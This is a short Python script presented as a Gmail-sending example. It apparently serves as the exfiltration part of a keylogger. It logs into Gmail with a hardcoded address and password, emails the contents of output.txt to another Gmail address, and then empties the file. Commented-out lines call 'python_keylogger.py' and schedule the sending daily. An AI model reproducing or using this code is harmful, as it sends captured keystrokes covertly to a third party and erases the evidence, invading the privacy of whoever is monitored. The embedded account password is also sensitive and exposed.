# Python code to illustrate Sending mail from
# your Gmail account
import smtplib
import time
import os
import datetime
import pip
import schedule

f = open('output.txt', 'w').close()


def dsendmail():
# creates SMTP session
	s = smtplib.SMTP('smtp.gmail.com', 587)
	s.ehlo()

	# start TLS for security
	s.starttls()

	# Authentication
	s.login("uor.27016005@gmail.com", "C0mput3rSc13nc3")
	f = open('output.txt', 'r')

	# message to be sent
	message = "Subject:{0}\n\n{1}".format(datetime.datetime.now().strftime("%d-%m-%y %H:%M:%S"), f.read())
	print(message)

	# sending the mail
	s.sendmail("uor.27016005@gmail.com", "dannyb0903@gmail.com", message)

	# terminating the session
	s.quit()
	# os.system('python_keylogger.py')
	f.close()
	f = open('output.txt', 'w').close()

# schedule.every().day.at("11:58").do(sendmail)
# while True:
    # schedule.run_pending()
    # time.sleep(1)


input("Start")
dsendmail()
input("Finish")
